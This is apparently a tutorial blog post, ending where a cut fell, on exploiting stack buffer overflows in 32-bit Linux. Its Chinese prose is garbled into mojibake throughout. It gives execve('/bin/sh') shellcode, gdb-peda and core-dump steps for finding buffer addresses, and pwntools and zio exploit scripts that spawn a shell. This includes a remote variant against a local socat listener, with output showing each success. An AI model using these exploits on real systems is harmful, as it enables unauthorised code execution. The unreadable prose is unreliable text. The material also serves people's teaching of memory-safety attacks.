<p>鍏堝～鍏�28涓�<code>A</code>杩涘幓锛屽垰濂藉彲浠ヨ鐩栧埌杩斿洖鍦板潃锛屽悓鏃舵敞鎰忕洰鏍囧湴鍧€鍐嶇紦鍐插尯鐨勪綅缃紝鐢变簬鎴戜滑杈撳叆鐨勫瓧绗︿覆闀垮害鍘熷洜锛屾鏃剁洰鏍囧湴鍧€鐩稿鍓嶉潰娴嬭瘯鏃剁殑鍦板潃瑕侀珮锛屼絾鏄浉瀵瑰湴鍧€鏄笉浼氬彉鐨�</p>
<pre><code>gdb-peda$ stack 10
0000| 0xbfffeef0 --&gt; 0xbfffef04 --&gt; 0xbfffefa4 --&gt; 0xb24f3e8f 
0004| 0xbfffeef4 --&gt; 0xbfffef30 (&#39;A&#39; &lt;repeats 28 times&gt;)
0008| 0xbfffeef8 --&gt; 0xbfffef10 --&gt; 0xffffffff 
0012| 0xbfffeefc --&gt; 0x8048254 (&quot;__libc_start_main&quot;)
0016| 0xbfffef00 --&gt; 0x0 
0020| 0xbfffef04 --&gt; 0xbfffefa4 --&gt; 0xb24f3e8f 
0024| 0xbfffef08 --&gt; 0xb7fbb000 --&gt; 0x1b1db0 
0028| 0xbfffef0c --&gt; 0xfd57 
0032| 0xbfffef10 --&gt; 0xffffffff 
0036| 0xbfffef14 --&gt; 0x2f (&#39;/&#39;)
`
</code></pre><p>鍙互浣跨敤Python鏉ュ畬鎴愬皬绔簭鐨勮浆鎹�</p>
<pre><code>&gt;&gt;&gt; print repr(struct.pack(&quot;&lt;I&quot;, 0xbfffef04))
&#39;\x04\xef\xff\xbf&#39;
</code></pre><p>淇敼杈撳叆鐨勫瓧绗︿覆</p>
<pre><code>char temp[32] = &quot;AAAAAAAAAAAAAAAAAAAAAAAA\x04\xef\xff\xbf&quot;;
</code></pre><p>缂栬瘧杩愯</p>
<pre><code>wnagzihxain@toT0C:~$ gcc -fno-stack-protector -fno-builtin -zexecstack -o Demo Demo.c
wnagzihxain@toT0C:~$ ./Demo
AAAAAAAAAAAAAAAAAAAAAAAA锟斤拷锟�
娈甸敊璇� (鏍稿績宸茶浆鍌�)
</code></pre><p>鎵ц瀹屾嫹璐濇寚浠わ紝姝ゆ椂鏍堝竷灞€濡備笅锛岃繑鍥炲湴鍧€宸茶鎴戜滑瑕嗙洊</p>
<pre><code>gdb-peda$ stack 20
0000| 0xbfffeef0 --&gt; 0xbfffef04 (&#39;A&#39; &lt;repeats 24 times&gt;, &quot;\004\357\377\277&quot;)
0004| 0xbfffeef4 --&gt; 0xbfffef30 (&#39;A&#39; &lt;repeats 24 times&gt;, &quot;\004\357\377\277&quot;)
0008| 0xbfffeef8 --&gt; 0xbfffef10 (&#39;A&#39; &lt;repeats 12 times&gt;, &quot;\004\357\377\277&quot;)
0012| 0xbfffeefc --&gt; 0x8048254 (&quot;__libc_start_main&quot;)
0016| 0xbfffef00 --&gt; 0x0 
0020| 0xbfffef04 (&#39;A&#39; &lt;repeats 24 times&gt;, &quot;\004\357\377\277&quot;)
0024| 0xbfffef08 (&#39;A&#39; &lt;repeats 20 times&gt;, &quot;\004\357\377\277&quot;)
0028| 0xbfffef0c (&#39;A&#39; &lt;repeats 16 times&gt;, &quot;\004\357\377\277&quot;)
0032| 0xbfffef10 (&#39;A&#39; &lt;repeats 12 times&gt;, &quot;\004\357\377\277&quot;)
0036| 0xbfffef14 (&quot;AAAAAAAA\004\357\377\277&quot;)
0040| 0xbfffef18 (&quot;AAAA\004\357\377\277&quot;)
0044| 0xbfffef1c --&gt; 0xbfffef04 (&#39;A&#39; &lt;repeats 24 times&gt;, &quot;\004\357\377\277&quot;)
0048| 0xbfffef20 --&gt; 0xbfffef00 --&gt; 0x0 
0052| 0xbfffef24 --&gt; 0xb7fbb000 --&gt; 0x1b1db0 
0056| 0xbfffef28 --&gt; 0xb7fb9244 --&gt; 0xb7e21020 (&lt;_IO_check_libio&gt;:    call   0xb7f28999 &lt;__x86.get_pc_thunk.ax&gt;)
0060| 0xbfffef2c --&gt; 0xb7e210ec (&lt;init_cacheinfo+92&gt;:    test   eax,eax)
0064| 0xbfffef30 (&#39;A&#39; &lt;repeats 24 times&gt;, &quot;\004\357\377\277&quot;)
0068| 0xbfffef34 (&#39;A&#39; &lt;repeats 20 times&gt;, &quot;\004\357\377\277&quot;)
0072| 0xbfffef38 (&#39;A&#39; &lt;repeats 16 times&gt;, &quot;\004\357\377\277&quot;)
0076| 0xbfffef3c (&#39;A&#39; &lt;repeats 12 times&gt;, &quot;\004\357\377\277&quot;)
</code></pre><p>鍗曟璧板畬鍚庨潰鐨勬寚浠わ紝姝ゆ椂EBP宸茶鎴戜滑瑕嗙洊鎴�<code>0x41414141</code>锛岃繑鍥炲湴鍧€涔熻瑕嗙洊鎴愪簡瀛楃涓查鍦板潃</p>
<p><img src="Image/14.png" alt=""></p>
<p>鎴戜滑鍗曟鎵ц锛孍IP琚垜浠姭鎸佸埌瀛楃涓茬殑棣栧湴鍧€</p>
<p><img src="Image/15.png" alt=""></p>
<p>褰撶劧杩欓噷涓€鍫�<code>inc ecx</code>鏄垜浠敤浜庢祴璇曠殑鏃犳剰涔夋寚浠わ紝濡傛灉鎴戜滑杈撳叆鐨勫瓧绗︿覆鏄湁鎰忎箟鐨勬寚浠ゅ憿锛�</p>
<p>鍥犱负Shellcode闀垮害鍘熷洜锛屾垜浠妸缂撳啿鍖哄紑澶т竴鐐癸紝涔熸洿绗﹀悎鐪熷疄鐜</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void Overflow(char temp[])
{
    char buffer[32];
    strcpy(buffer, temp);
    printf(&quot;%s\n&quot;, buffer);
}

int main()
{
    char temp[64] = &quot;AAAA&quot;;
    Overflow(temp);
    return 0;
}
</code></pre><p>杩愯鍒版嫹璐濇寚浠わ紝浠旂粏瑙傚療EBP鍜岀涓€涓弬鏁�</p>
<p><img src="Image/16.png" alt=""></p>
<p><code>0xbfffeed0</code>鏄洰鏍囧瓧绗︿覆鍦ㄧ紦鍐插尯鐨勮捣濮嬩綅缃紝璺濈EBP鏈�44瀛楄妭鐨勯暱搴�</p>
<p>淇敼杈撳叆鐨勫瓧绗︿覆</p>
<pre><code>char temp[64] = &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB\xd0\xee\xff\xbf&quot;;
</code></pre><p>鎷疯礉鍚庤瀵熸爤鐨勬儏鍐碉紝鍙互鐪嬪埌EBP宸茬粡琚�<code>BBBB</code>瑕嗙洊</p>
<pre><code>gdb-peda$ stack 30
0000| 0xbfffeec0 --&gt; 0xbfffeed0 (&#39;A&#39; &lt;repeats 40 times&gt;, &quot;BBBB\320\356\377\277&quot;)
0004| 0xbfffeec4 --&gt; 0xbfffef10 (&#39;A&#39; &lt;repeats 40 times&gt;, &quot;BBBB\320\356\377\277&quot;)
0008| 0xbfffeec8 --&gt; 0xb7fff918 --&gt; 0x0 
0012| 0xbfffeecc --&gt; 0xf0b2ff 
0016| 0xbfffeed0 (&#39;A&#39; &lt;repeats 40 times&gt;, &quot;BBBB\320\356\377\277&quot;)
0020| 0xbfffeed4 (&#39;A&#39; &lt;repeats 36 times&gt;, &quot;BBBB\320\356\377\277&quot;)
0024| 0xbfffeed8 (&#39;A&#39; &lt;repeats 32 times&gt;, &quot;BBBB\320\356\377\277&quot;)
0028| 0xbfffeedc (&#39;A&#39; &lt;repeats 28 times&gt;, &quot;BBBB\320\356\377\277&quot;)
0032| 0xbfffeee0 (&#39;A&#39; &lt;repeats 24 times&gt;, &quot;BBBB\320\356\377\277&quot;)
0036| 0xbfffeee4 (&#39;A&#39; &lt;repeats 20 times&gt;, &quot;BBBB\320\356\377\277&quot;)
0040| 0xbfffeee8 (&#39;A&#39; &lt;repeats 16 times&gt;, &quot;BBBB\320\356\377\277&quot;)
0044| 0xbfffeeec (&#39;A&#39; &lt;repeats 12 times&gt;, &quot;BBBB\320\356\377\277&quot;)
0048| 0xbfffeef0 (&quot;AAAAAAAABBBB\320\356\377\277&quot;)
0052| 0xbfffeef4 (&quot;AAAABBBB\320\356\377\277&quot;)
0056| 0xbfffeef8 (&quot;BBBB\320\356\377\277&quot;)
0060| 0xbfffeefc --&gt; 0xbfffeed0 (&#39;A&#39; &lt;repeats 40 times&gt;, &quot;BBBB\320\356\377\277&quot;)
0064| 0xbfffef00 (0xbfffef00)
0068| 0xbfffef04 --&gt; 0xbfffefa4 --&gt; 0xb5e79f4a 
0072| 0xbfffef08 --&gt; 0xb7fbb000 --&gt; 0x1b1db0 
0076| 0xbfffef0c --&gt; 0xfd57 
0080| 0xbfffef10 (&#39;A&#39; &lt;repeats 40 times&gt;, &quot;BBBB\320\356\377\277&quot;)
0084| 0xbfffef14 (&#39;A&#39; &lt;repeats 36 times&gt;, &quot;BBBB\320\356\377\277&quot;)
0088| 0xbfffef18 (&#39;A&#39; &lt;repeats 32 times&gt;, &quot;BBBB\320\356\377\277&quot;)
0092| 0xbfffef1c (&#39;A&#39; &lt;repeats 28 times&gt;, &quot;BBBB\320\356\377\277&quot;)
0096| 0xbfffef20 (&#39;A&#39; &lt;repeats 24 times&gt;, &quot;BBBB\320\356\377\277&quot;)
</code></pre><p>缂撳啿鍖哄凡缁忓紑鐨勮冻澶熷ぇ浜嗭紝鎴戜滑濉厖涓€娈垫湁鏁堢殑鎸囦护锛岃繖娈典唬鐮佷粠钂哥背閭ｉ噷鎶勬潵鐨勶紝閮藉樊涓嶅锛屼笉瑕佹湁<code>bad char</code>灏辫</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void Overflow(char temp[])
{
    char buffer[32];
    strcpy(buffer, temp);
    printf(&quot;%s\n&quot;, buffer);
}

int main()
{
    //execve(&quot;/bin/sh&quot;);
    char temp[64] = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xd0\xee\xff\xbf&quot;;
    Overflow(temp);
    return 0;
}
</code></pre><p>gdb璋冭瘯璺戣捣鏉ワ紝鎴愬姛杩斿洖浜嗕竴涓猻hell</p>
<pre><code>gdb-peda$ r
Starting program: /home/wnagzihxain/Demo 
1锟斤拷锟絈h//shh/bin锟斤拷锟�
                  锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟�
process 5854 is executing new program: /bin/dash
$ id    
[New process 5858]
process 5858 is executing new program: /usr/bin/id
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/i386-linux-gnu/libthread_db.so.1&quot;.
uid=1000(wnagzihxain) gid=1000(wnagzihxain) groups=1000(wnagzihxain),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$ [Inferior 2 (process 5858) exited normally]
Warning: not running or target is remote
</code></pre><p>涓嶉敊锛岄紦鎺岋紝鎾掕姳<del>~</del>~</p>
<p>鎴戜滑涓嶄娇鐢╣db璋冭瘯妯″紡锛岀洿鎺ヨ繍琛�</p>
<pre><code>wnagzihxain@toT0C:~$ ./Demo
1锟斤拷锟絈h//shh/bin锟斤拷锟�
                  锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟�
娈甸敊璇� (鏍稿績宸茶浆鍌�)
</code></pre><p>杩樻槸涓€鏍风殑杩斿洖鍦板潃锛岃繕鏄竴鏍风殑Shellcode锛屼絾鏄负浠€涔堣繖閲屽氨鍑洪敊浜嗗憿锛�</p>
<p>鍘熷洜鏄洜涓篻db浼氬奖鍝嶇▼搴忕殑瀹為檯鍦板潃锛屽湪gdb璋冭瘯妯″紡涓嬶紝鎴戜滑鐪嬪埌鐨勫湴鍧€璺熺湡瀹炵幆澧冧笅鏄笉涓€鏍风殑(鏈鍑鸿嚜钂哥背鐨勩€婁竴姝ヤ竴姝ュROP涔媗inux_x86绡囥€�)</p>
<p>鎵€浠ユ祴璇曞嚭婧㈠嚭鐐瑰悗锛屾垜浠氨闇€瑕佹壘鍒�<code>buffer</code>鍦ㄥ唴瀛樼殑鐪熷疄鍦板潃</p>
<p>鎵惧埌鐪熷疄鍦板潃鏈変袱绉嶆瘮杈冨父鐢ㄧ殑鏂规硶锛屼竴涓槸<code>core dump</code>锛屽彟涓€涓槸<code>attach</code></p>
<p>鍏堟潵浣跨敤<code>core dump</code>锛岃繖涓渶瑕佸紑鍚紝杩欓噷杩樻槸鎶勮捀绫崇殑锛�<code>core.%t</code>鐪熷ソ鐢�</p>
<pre><code>wnagzihxain@toT0C:~$ ulimit -c unlimited
wnagzihxain@toT0C:~$ sudo sh -c &#39;echo &quot;/home/wnagzihxain/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&#39;
</code></pre><p>杩愯宕╂簝锛岃褰曞穿婧冪幇鍦�</p>
<pre><code>wnagzihxain@toT0C:~$ ./Demo
1锟斤拷锟絈h//shh/bin锟斤拷锟�
                  锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟�
娈甸敊璇� (鏍稿績宸茶浆鍌�)
</code></pre><p>鏌ョ湅鐢熸垚鐨刢ore鏂囦欢</p>
<pre><code>wnagzihxain@toT0C:~$ ls -l core.1491475716
-rw------- 1 wnagzihxain wnagzihxain 360448 4鏈�   6 18:48 core.1491475716
</code></pre><p>gdb鎵撳紑core鏂囦欢锛屾煡鐪嬩竴涓嬮鍦板潃鐨勬暟鎹繕鏄緢鏈夊繀瑕佺殑锛屽彲浠ヨ窡钂哥背涓€鏍凤紝鐢�<code>x/10s</code>鏌ョ湅瀛楃涓�</p>
<pre><code>wnagzihxain@toT0C:~$ gdb Demo core.1491475716 
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;
and &quot;show warranty&quot; for details.
This GDB was configured as &quot;i686-linux-gnu&quot;.
Type &quot;show configuration&quot; for configuration details.
For bug reporting instructions, please see:
&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
Find the GDB manual and other documentation resources online at:
&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
For help, type &quot;help&quot;.
Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...
Reading symbols from Demo...(no debugging symbols found)...done.
[New LWP 6173]
Core was generated by `./Demo&#39;.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0xbfffeed0 in ?? ()
gdb-peda$ x/x $sp-48
0xbfffef20:    0x31
gdb-peda$ x/16x $sp-48
0xbfffef20:    0x31    0xc9    0xf7    0xe1    0x51    0x68    0x2f    0x2f
0xbfffef28:    0x73    0x68    0x68    0x2f    0x62    0x69    0x6e    0x89
</code></pre><p>纭濂藉湴鍧€鏄�<code>0xbfffef20</code>锛屼娇鐢ㄥ皬绔簭鍐欏叆Shellcode锛岀洿鎺ヨ繍琛岋紝杩欎笅濡ュΕ鐨�</p>
<pre><code>wnagzihxain@toT0C:~$ gcc -fno-stack-protector -fno-builtin -zexecstack -o Demo Demo.c
wnagzihxain@toT0C:~$ ./Demo
1锟斤拷锟絈h//shh/bin锟斤拷锟�
                  锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟� 锟斤拷锟�
$ id
uid=1000(wnagzihxain) gid=1000(wnagzihxain) groups=1000(wnagzihxain),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$ whoami
wnagzihxain
$
</code></pre><p>鑷充簬绗簩绉嶆柟娉�<code>gdb attach</code>锛岀◢寰夯鐑︾偣锛宎ttach涓婂幓涔嬪悗鍐嶆壘鍒扮洰鏍囧湴鍧€灏辫浜�</p>
<pre><code>wnagzihxain@toT0C:~$ ps -ax | grep Demo
 5840 pts/19   T      0:00 gdb Demo
 6307 pts/19   S+     0:00 ./Demo
 6341 pts/20   S+     0:00 grep --color=auto Demo
</code></pre><h2 id="0x04-">0x04 璺熺幇瀹炴帴杞�</h2>
<p>铏界劧杩欎竴绡囨槸绠€鍗曠殑鍏ラ棬锛屼絾鏄垜浠笉鑳戒贡鏉ュ晩锛屽凹鐜涜皝绋嬪簭鑷甫涓€娈礢hellcode鍟婏紝浣犳悶鏀诲嚮涔熻鎸夌収鍩烘湰娉曞晩锛侊紒锛侊紒锛侊紒</p>
<p>杩樻湁璋佺殑娴嬭瘯婧㈠嚭鐐规槸闈犵洰娴嬬殑銆傘€傘€傘€傘€傘€�</p>
<p>鍐嶆浣犱篃寰楁悶涓墜鍔ㄨ緭鍏ユ暟鎹搰</p>
<p>鏈潵鎯虫帴鐫€鐢ㄤ笂闈㈢殑浠ｇ爜鐨勶紝浣嗘槸鑰冭檻鍒版湁浜涚粏鑺傝捀绫冲笀鍌呮病鍐欑殑鎴戝彲浠ュ鍐欏啓锛屽ぇ瀹跺彲浠ヤ簰鐩稿弬鑰冿紝鎵€浠ヨ繖閲屼娇鐢ㄨ捀绫崇殑浠ｇ爜婕旂ず涓€娉�</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;

void Overflow()
{
    char buffer[128];
    read(STDIN_FILENO, buffer, 256);
}

int main()
{
    Overflow();
    write(STDOUT_FILENO, &quot;Hello,World\n&quot;, 13);
    return 0;
}
</code></pre><p>娴嬭瘯婧㈠嚭鐐癸紝杩欓噷浠嬬粛涓柊鏂规硶锛岃捀绫抽偅閲屽啓鐨勬槸<code>pattern.py</code>锛岃繖閲屽彲浠ヤ娇鐢╬eda鐨�<code>pattern create</code>鐩存帴鐢熸垚锛岄暱搴﹂殢鎰忥紝澶熷ぇ灏辫</p>
<pre><code>gdb-peda$ pattern create 200
&#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&#39;
</code></pre><p>鐒跺悗<code>r</code>锛屽埌杈撳叆鐨勫湴鏂癸紝鎶婁笂闈㈢殑鏁版嵁鎷疯礉杩涘幓</p>
<p><img src="Image/17.png" alt=""></p>
<p>娉ㄦ剰鏈€鍚庝竴鍙ワ紝peda甯垜浠妸寮傚父鐨勫湴鏂硅緭鍑烘潵浜嗭紝杩欓噷灏辨槸杩斿洖鍦板潃鐨勬暟鎹�</p>
<pre><code>[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41416d41 in ?? ()
</code></pre><p>鏍规嵁杩欎釜鏁版嵁锛屾垜浠壘鍒伴渶瑕佽鐩栭暱搴�</p>
<pre><code>gdb-peda$ pattern offset 0x41416d41
1094806849 found at offset: 140
</code></pre><p>鎴戜滑鍏堟潵浠嬬粛涓€涓猄hellcode寮€鍙戝伐鍏凤細pwntools</p>
<p>瀹夎</p>
<pre><code>root@toT0C:/home/wnagzihxain# pip install pwn
......
&gt;&gt;&gt; import pwn
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
&gt;&gt;&gt; pwn.asm(&quot;xor eax,eax&quot;)
&#39;1\xc0&#39;
&gt;&gt;&gt;
</code></pre><p>鍐欎竴涓畝鍗曠殑婧㈠嚭鑴氭湰锛岀劧鍚庝娇鐢�<code>core dump</code>鏁版嵁鎵惧埌鐪熷疄鐨�<code>buffer</code>璧峰鍦板潃锛屼箣鎵€浠ヤ笉鐩存帴浣跨敤鎵嬪姩杈撳叆鐨勬柟娉曟壘<code>buffer</code>璧峰鍦板潃鏄洜涓哄湪鎴戣繖娴嬭瘯锛屼袱绉嶆柟娉曟€讳細鏈夊亸宸紝浠ヤ娇鐢╬wntools鐨凱oc娴嬭瘯鍑烘潵鍦板潃涓哄噯</p>
<pre><code>#!/usr/bin/env python

from pwn import *

attack = process(&#39;./Demo&#39;)

payload = &#39;\x90&#39; * 140 + &#39;AAAA&#39;

attack.send(payload)

attack.interactive()
</code></pre><p>杩愯鍚庣敓鎴�<code>core dump</code>鏁版嵁</p>
<pre><code>gdb-peda$ x/50x $esp-144
0xbfffef00:    0x90909090    0x90909090    0x90909090    0x90909090
0xbfffef10:    0x90909090    0x90909090    0x90909090    0x90909090
0xbfffef20:    0x90909090    0x90909090    0x90909090    0x90909090
0xbfffef30:    0x90909090    0x90909090    0x90909090    0x90909090
0xbfffef40:    0x90909090    0x90909090    0x90909090    0x90909090
0xbfffef50:    0x90909090    0x90909090    0x90909090    0x90909090
0xbfffef60:    0x90909090    0x90909090    0x90909090    0x90909090
0xbfffef70:    0x90909090    0x90909090    0x90909090    0x90909090
0xbfffef80:    0x90909090    0x90909090    0x90909090    0x41414141
0xbfffef90:    0xb7fbb3dc    0xbfffefb0    0x00000000    0xb7e21637
0xbfffefa0:    0xb7fbb000    0xb7fbb000    0x00000000    0xb7e21637
0xbfffefb0:    0x00000001    0xbffff044    0xbffff04c    0x00000000
0xbfffefc0:    0x00000000    0x00000000
</code></pre><p><code>buffer</code>璧峰鍦板潃鏄�<code>0xbfffef00</code>锛屼竴鑸紑鍙慡hellcode鐨勬椂鍊欙紝瑕侀伩鍏嶈繖浜�<code>00</code>锛屼細閫犳垚鏌愪簺鍑芥暟鍦ㄦ搷浣淪hellcode鏃跺彂鐢熸埅鏂�</p>
<p>鎵€浠ユ垜浠繖閲屾妸璺冲洖鐨勫湴鍧€鏀逛负鍔�4瀛楄妭<code>0xbfffef04</code>锛屽墠闈㈢殑鍥涘瓧鑺傜┖鐧戒娇鐢�<code>\x90</code>濉厖</p>
<p>鏉ュ畬鎴怑XP鐨勭紪鍐�</p>
<pre><code>#!/usr/bin/env python

from pwn import *

attack = process(&#39;./Demo&#39;)

retn = 0xbfffef04

shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;
shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;
shellcode += &quot;\x0b\xcd\x80&quot;

payload = &#39;\x90&#39; * 4 + shellcode + &#39;\x90&#39; * (136 - len(shellcode)) + p32(retn)

attack.send(payload)

attack.interactive()
</code></pre><p>鎵ц锛岃繑鍥炰竴涓猄hell</p>
<pre><code>wnagzihxain@toT0C:~$ python Exp.py 
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
[+] Starting local process &#39;./Demo&#39;: pid 2395
[*] Switching to interactive mode
$ id
uid=1000(wnagzihxain) gid=1000(wnagzihxain) groups=1000(wnagzihxain),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$ whoami
wnagzihxain
$
</code></pre><p>鏈€鍚庯紝涓轰簡妯℃嫙杩滅▼鏀诲嚮锛屼娇鐢�<code>socat</code>缁戝畾鏈満绔彛</p>
<p>瀹夎<code>socat</code></p>
<pre><code>root@toT0C:/home/wnagzihxain# sudo apt-get install socat
</code></pre><p>鏂板紑Terminal锛岃繍琛屽悗鏀句竴杈�</p>
<pre><code>wnagzihxain@toT0C:~$ socat TCP-LISTEN:23333,fork EXEC:./Demo
</code></pre><p>淇敼宕╂簝娴嬭瘯鑴氭湰</p>
<pre><code>#!/usr/bin/env python

from pwn import *

attack = remote(&#39;127.0.0.1&#39;, 23333)

payload = &#39;\x90&#39; * 140 + &#39;AAAA&#39;

attack.send(payload)

attack.interactive()
</code></pre><p>浣跨敤gdb璋冭瘯璇ore鏂囦欢锛屾壘鍒�<code>buffer</code>璧峰鍦板潃鏄�<code>0xbfffee50</code></p>
<pre><code>gdb-peda$ x/50x $esp-144
0xbfffee50:    0x90909090    0x90909090    0x90909090    0x90909090
0xbfffee60:    0x90909090    0x90909090    0x90909090    0x90909090
0xbfffee70:    0x90909090    0x90909090    0x90909090    0x90909090
0xbfffee80:    0x90909090    0x90909090    0x90909090    0x90909090
0xbfffee90:    0x90909090    0x90909090    0x90909090    0x90909090
0xbfffeea0:    0x90909090    0x90909090    0x90909090    0x90909090
0xbfffeeb0:    0x90909090    0x90909090    0x90909090    0x90909090
0xbfffeec0:    0x90909090    0x90909090    0x90909090    0x90909090
0xbfffeed0:    0x90909090    0x90909090    0x90909090    0x41414141
0xbfffeee0:    0xb7fbb3dc    0xbfffef00    0x00000000    0xb7e21637
0xbfffeef0:    0xb7fbb000    0xb7fbb000    0x00000000    0xb7e21637
0xbfffef00:    0x00000001    0xbfffef94    0xbfffef9c    0x00000000
0xbfffef10:    0x00000000    0x00000000
</code></pre><p>淇敼EXP</p>
<pre><code>#!/usr/bin/env python

from pwn import *

attack = remote(&#39;127.0.0.1&#39;, 23333)

retn = 0xbfffee50

shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;
shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;
shellcode += &quot;\x0b\xcd\x80&quot;

payload = &#39;\x90&#39; * 4 + shellcode + &#39;\x90&#39; * (136 - len(shellcode)) + p32(retn)

attack.send(payload)

attack.interactive()
</code></pre><p>鏈€缁堢殑杩滅▼鏀诲嚮鏁堟灉</p>
<pre><code>wnagzihxain@toT0C:~$ python Exp.py 
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
[+] Opening connection to 127.0.0.1 on port 23333: Done
[*] Switching to interactive mode
$ id
uid=1000(wnagzihxain) gid=1000(wnagzihxain) groups=1000(wnagzihxain),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$
</code></pre><p>铔ソ铔ソ锛岄櫎浜唒wntools澶栵紝杩樻湁涓€涓伐鍏凤細zio</p>
<pre><code>from zio import *

attack = zio((&#39;127.0.0.1&#39;, 23333))

retn = 0xbfffee50

shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;

payload = &#39;\x90&#39; * 4 + shellcode + &#39;\x90&#39; * (136 - len(shellcode)) + l32(retn)

attack.write(payload)

attack.interact()
</code></pre><p>鏁堟灉</p>
<pre><code>wnagzihxain@toT0C:~$ python Exp.py 
锟斤拷锟斤拷1锟斤拷锟絈h//shh/bin锟斤拷锟�
                      锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟絇锟斤拷锟�
id
uid=1000(wnagzihxain) gid=1000(wnagzihxain) groups=1000(wnagzihxain),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
</code></pre><p>涓汉姣旇緝鍠滄pwntools</p>
<h2 id="0x05-">0x05 灏忕粨</h2>
<p>鍏充簡鎵€鏈夌殑淇濇姢鏈哄埗杩樼敤浜嗙‖缂栫爜鏉ュ啓Shellcode锛屾仴銇氥亱銇椼亜鎬濄亜銈掋仚銈�</p>
<h2 id="0x6-references">0x6 References</h2>
<ul>
<li>涓€姝ヤ竴姝ュROP涔媗inux_x86绡�: <a href="https://jaq.alibaba.com/community/art/show?spm=a313e.7916646.24000001.54.WniXFY&amp;articleid=403">https://jaq.alibaba.com/community/art/show?spm=a313e.7916646.24000001.54.WniXFY&amp;articleid=403</a></li><li>鐜颁唬鏍堟孩鍑哄埄鐢ㄦ妧鏈熀纭€锛歊OP: <a href="http://bobao.360.cn/learning/detail/3694.html">http://bobao.360.cn/learning/detail/3694.html</a></li><li>Linux (x86) Exploit Development Series: <a href="https://sploitfun.wordpress.com/2015/06/26/linux-x86-exploit-development-tutorial-series/">https://sploitfun.wordpress.com/2015/06/26/linux-x86-exploit-development-tutorial-series/</a></li><li>Stack based buffer overflow ExploitationTutorial: <a href="https://www.exploit-db.com/docs/28475.pdf">https://www.exploit-db.com/docs/28475.pdf</a></li></ul>
<h2 id="0x07-">0x07 闄勫綍</h2>
<p>Android鏍稿績绯荤粺瀵圭紦瑙ｆ妧鏈殑鏀寔鍘嗗彶锛屼粠涓婇潰鎻愬埌鐨勯偅鏈潈濞佹寚鍗楅噷鎶勫嚭鏉ョ殑锛�<strong>鎵嬫暡</strong>鍑烘潵鐨�</p>
<ul>
<li>1.5<ul>
<li>鍦˙ionic涓鐢�%n鏍煎紡鎻忚堪绗�</li><li>浜岃繘鍒舵枃浠剁紪璇戞椂鍚敤鏍圕ookie(-fstack-protector)</li><li>浣跨敤safe-iop搴�</li><li>浣跨敤鍔犲浐鐨刣lmalloc</li><li>瀹炵幇calloc鏁存暟婧㈠嚭妫€鏌�</li><li>鍦ㄥ唴鏍镐腑鏀寔NX</li></ul>
